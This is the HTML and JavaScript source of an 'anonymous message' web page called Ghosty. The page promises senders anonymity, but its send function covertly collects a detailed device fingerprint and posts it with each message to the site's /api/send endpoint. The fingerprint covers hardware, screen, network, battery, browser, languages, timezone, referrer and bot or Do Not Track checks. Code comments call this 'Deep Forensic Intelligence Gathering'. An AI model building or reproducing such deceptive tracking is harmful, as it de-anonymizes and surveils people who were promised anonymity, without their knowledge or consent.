<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghosty | Send Anonymous Messages</title>
    <link rel="stylesheet" href="style.css">
    <script src="/_vercel/insights/script.js"></script>
    <style>
        /* Ghostly Vanish Animation */
        .vanish {
            animation: ghostVanish 0.8s forwards;
            pointer-events: none;
        }

        @keyframes ghostVanish {
            0% {
                transform: scale(1);
                opacity: 1;
                filter: blur(0);
            }

            50% {
                transform: scale(1.05) translateY(-10px);
                opacity: 0.5;
                filter: blur(2px);
            }

            100% {
                transform: scale(0.9) translateY(-20px);
                opacity: 0;
                filter: blur(10px);
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="card">
            <div class="profile-pic">👻</div>
            <h1>Ghosty</h1>
            <p>Send me an anonymous message!</p>

            <textarea id="msgInput" placeholder="Write something secret..." maxlength="500"></textarea>

            <button onclick="sendMsg()" id="sendBtn">Send Anonymously</button>
            <p id="status"></p>
        </div>
    </div>

    <script>
        // 🔊 Preload Success Sound
        const whooshSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2057/2057-preview.mp3');

        // Helper to check for generic browser features that might indicate stealth/bots
        function detectStealth() {
            let stealthScore = 0;
            const reasons = [];

            if (navigator.webdriver) { stealthScore += 100; reasons.push("WebDriver (Bot)"); }
            if (window.outerWidth === 0 && window.outerHeight === 0) { stealthScore += 50; reasons.push("Headless"); }
            if (!navigator.cookieEnabled) { stealthScore += 20; reasons.push("Cookies Disabled"); }
            if (navigator.doNotTrack === "1") { stealthScore += 10; reasons.push("DNT Enabled"); }

            return { score: stealthScore, reasons: reasons.length > 0 ? reasons.join(", ") : "None detected" };
        }

        async function sendMsg() {
            const btn = document.getElementById('sendBtn');
            const status = document.getElementById('status');
            const msgInput = document.getElementById('msgInput');
            const message = msgInput.value.trim();

            if (!message) return alert("You can't send an empty ghost!");

            btn.disabled = true;
            btn.innerText = "Analyzing...";
            status.innerText = "";

            // 🕵️ Deep Forensic Intelligence Gathering
            let batteryInfo = { level: "N/A", charging: "N/A" };
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    batteryInfo = {
                        level: Math.round(bat.level * 100) + "%",
                        charging: bat.charging ? "🔌 Yes" : "🔋 No"
                    };
                }
            } catch (e) {
                console.warn("Battery API not supported or blocked");
            }

            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            // Collect advanced window/screen metrics
            const screenInfo = {
                res: `${window.screen.width}x${window.screen.height}`,
                avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
                depth: window.screen.colorDepth + "-bit",
                ratio: window.devicePixelRatio,
                window: `${window.innerWidth}x${window.innerHeight}`
            };

            const stealthInfo = detectStealth();

            // Detailed Device Fingerprint
            const deviceInfo = {
                hardware: {
                    cores: navigator.hardwareConcurrency || "N/A",
                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                    platform: navigator.platform || "Unknown",
                    vendor: navigator.vendor || "Unknown",
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                display: screenInfo,
                network: {
                    type: conn ? conn.effectiveType : "N/A",
                    downlink: conn ? conn.downlink + " Mbps" : "N/A",
                    rtt: conn ? conn.rtt + " ms" : "N/A",
                    saveData: conn ? (conn.saveData ? "Yes" : "No") : "N/A"
                },
                browser: {
                    name: navigator.userAgent,
                    lang: navigator.language || navigator.userLanguage,
                    languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
                    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
                    online: navigator.onLine ? "Yes" : "No",
                    pdfViewer: navigator.pdfViewerEnabled ? "Supported" : "No"
                },
                stealth: stealthInfo,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timeOffset: new Date().getTimezoneOffset() / -60, // e.g., +6 for Dhaka
                battery: batteryInfo,
                referrer: document.referrer || "Direct Link"
            };

            try {
                const res = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message, deviceInfo })
                });

                const data = await res.json();

                if (res.ok) {
                    // 🔊 sound, 📳 vibration, ✨ animation
                    whooshSound.play().catch(e => console.log("Audio play prevented:", e));
                    if (navigator.vibrate) navigator.vibrate([50, 100, 50]);
                    msgInput.classList.add('vanish');

                    status.style.color = "#bb86fc";
                    status.innerText = "👻 Ghost delivered with full intel.";

                    setTimeout(() => {
                        msgInput.value = "";
                        msgInput.classList.remove('vanish');
                        startCooldown(30);
                    }, 800);
                } else {
                    status.style.color = "#ff4f4f";
                    status.innerText = `❌ ${data.error || "The ghost got lost."}`;
                    btn.disabled = false;
                    btn.innerText = "Send Anonymously";
                }
            } catch (e) {
                status.style.color = "#ff4f4f";
                status.innerText = "❌ Forensic transmission failed.";
                btn.disabled = false;
                btn.innerText = "Send Anonymously";
            }
        }

        function startCooldown(seconds) {
            const btn = document.getElementById('sendBtn');
            let timeLeft = seconds;
            const timer = setInterval(() => {
                btn.innerText = `Resting... (${timeLeft}s)`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    btn.disabled = false;
                    btn.innerText = "Send Anonymously";
                }
            }, 1000);
        }
    </script>
</body>

</html>
